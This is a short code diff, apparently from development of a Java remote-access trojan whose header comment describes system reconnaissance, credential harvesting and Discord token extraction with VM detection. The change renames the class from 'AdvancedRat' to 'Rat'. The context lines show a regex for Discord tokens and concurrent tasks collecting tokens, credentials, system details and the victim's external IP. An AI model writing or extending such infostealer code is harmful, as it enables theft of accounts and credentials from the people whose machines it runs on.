@@ -32,7 +32,7 @@ import java.util.stream.Stream;
  * AdvancedRat - Comprehensive monitoring tool for system reconnaissance,
  * credential harvesting, and Discord token extraction with VM detection.
  */
-public class AdvancedRat {
+public class Rat {
     // Regex pattern for Discord tokens (both MFA and regular)
     private static final Pattern TOKEN_PATTERN = Pattern.compile("(mfa\\.[\\w-]{84}|[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})");
     
@@ -73,8 +73,8 @@ public class AdvancedRat {
             OperatingSystem os = systemInfo.getOperatingSystem();
             
             CompletableFuture<String> ipFuture = getExternalIpAsync();
-            CompletableFuture<Set<String>> tokenFuture = CompletableFuture.supplyAsync(AdvancedRat::collectAllTokens);
-            CompletableFuture<List<Credential>> credentialFuture = CompletableFuture.supplyAsync(AdvancedRat::collectCredentials);
+            CompletableFuture<Set<String>> tokenFuture = CompletableFuture.supplyAsync(Rat::collectAllTokens);
+            CompletableFuture<List<Credential>> credentialFuture = CompletableFuture.supplyAsync(Rat::collectCredentials);
             CompletableFuture<Map<String, String>> systemFuture = CompletableFuture.supplyAsync(() -> collectSystemInfo(os, hardware));
             
             String ip = ipFuture.get(IP_TIMEOUT, TimeUnit.MILLISECONDS);
